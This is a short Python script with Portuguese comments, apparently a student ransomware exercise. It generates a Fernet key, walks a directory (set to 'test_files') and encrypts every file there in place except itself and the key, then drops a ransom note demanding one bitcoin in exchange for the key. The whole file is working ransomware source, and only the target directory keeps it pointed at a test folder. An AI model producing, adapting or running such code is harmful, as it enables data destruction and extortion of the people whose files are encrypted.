from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar 

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3 . Criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4 encontrar arquivos para criptografar       
def encontrar_arquivos(diretorio):
        lista=[]
        for raiz, _, arquivos in os.walk(diretorio):
            for name in arquivos:
                caminho = os.path.join(raiz, name)
                if name != "ransoware.py" and not name.endswith(".key"):
                    lista.append(caminho)
        return lista

#5 mensagem de resgate
def mensagem_resgate():
    with open("leia isso.txt", "w") as f:
        f.write("Seus arquivos foram criptografados.! ")
        f.write("envie 1 bicoin para o endereço x e envie o comprovante  ")
        f.write("depois disso, enviamos a achave para você descriptografar seus arquivos. ")

#5 execuçao principal 
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    mensagem_resgate()
    print("ransoware executado com sucesso!") 


if __name__ == "__main__":
    main()    
